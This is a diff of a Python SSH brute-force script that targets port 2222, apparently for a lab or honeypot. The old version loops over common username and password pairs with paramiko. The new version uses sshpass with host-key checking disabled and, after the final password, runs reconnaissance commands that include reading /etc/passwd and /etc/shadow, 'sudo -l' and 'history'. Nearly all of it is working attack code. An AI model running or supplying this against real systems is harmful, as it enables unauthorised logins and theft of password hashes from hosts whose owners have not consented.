@@ -1,75 +1,57 @@
-import paramiko
+import subprocess
 import time
-import random
 import sys
-import socket
-from paramiko.ssh_exception import SSHException
 
-# =========================
-# TARGET CONFIGURATION
-# =========================
-TARGET_IP = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
+TARGET_IP = sys.argv[1]
 PORT = 2222
+USERNAME = "ubuntu"
 
-# =========================
-# ATTACK DATA
-# =========================
-usernames = ["root", "admin", "user", "test", "ubuntu", "guest"]
-passwords = ["12345", "password", "admin", "root", "toor", "qwerty", "letmein"]
-commands = ["ls", "pwd", "whoami", "uname -a"]
+PASSWORDS = [
+    "letmein", "qwerty", "pass123", "welcome",
+    "monkey", "dragon", "master", "sunshine",
+    "princess", "shadow",
+    "ubuntu"
+]
 
-# =========================
-# ATTACK FUNCTION
-# =========================
-def attempt_login(username, password):
-    client = paramiko.SSHClient()
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+COMMANDS = [
+    "whoami", "id", "uname -a", "hostname",
+    "cat /etc/passwd", "ls", "ls -la", "pwd",
+    "cd /etc", "ls", "cd /tmp", "ls",
+    "netstat", "ifconfig", "ps aux",
+    "cat /etc/shadow", "sudo -l", "history"
+]
 
-    try:
-        print(f"[ATTEMPT] {username}:{password}")
+def attempt(ip, port, username, password, run_commands=False):
+    print(f"[*] Trying {username}:{password}")
 
-        client.connect(
-            TARGET_IP,
-            port=PORT,
-            username=username,
-            password=password,
-            timeout=8,              # increased timeout
-            banner_timeout=8,
-            auth_timeout=8
+    ssh_opts = [
+        "sshpass", "-p", password, "ssh",
+        "-o", "StrictHostKeyChecking=no",
+        "-o", "ConnectTimeout=8",
+        "-o", "PreferredAuthentications=password",
+        "-o", "PubkeyAuthentication=no",
+        "-p", str(port),
+        f"{username}@{ip}"
+    ]
+
+    if not run_commands:
+        subprocess.run(
+            ssh_opts,
+            capture_output=True, text=True, timeout=15
         )
+        print(f"[-] Failed: {username}:{password}")
+        return
 
-        print(f"[SUCCESS] {username}:{password}")
-
-        for cmd in random.sample(commands, 3):
-            client.exec_command(cmd)
-            print(f"[COMMAND] {cmd}")
-            time.sleep(1)
-
-        client.close()
-
-    except (SSHException, socket.timeout):
-        print(f"[TIMEOUT] {username}:{password}")
-
-    except Exception:
-        print(f"[FAILED] {username}:{password}")
-
-# =========================
-# MAIN LOOP
-# =========================
-def main():
-    print(f"[INFO] Target: {TARGET_IP}:{PORT}\n")
-
-    attempts = 40
-
-    for i in range(attempts):
-        username = random.choice(usernames)
-        password = random.choice(passwords)
-
-        attempt_login(username, password)
-
-        delay = random.uniform(2, 4)   # slightly slower = more stable
-        print(f"[WAIT] {round(delay, 2)} seconds\n")
-        time.sleep(delay)
+    for cmd in COMMANDS:
+        subprocess.run(
+            ssh_opts + [cmd],
+            capture_output=True, text=True, timeout=15
+        )
+        print(f"[+] {username}:{password} | ran: {cmd}")
+        time.sleep(0.5)
 
 if __name__ == "__main__":
-    main()
+    for i, password in enumerate(PASSWORDS):
+        is_last = (i == len(PASSWORDS) - 1)
+        attempt(TARGET_IP, PORT, USERNAME, password, run_commands=is_last)
+        time.sleep(1)
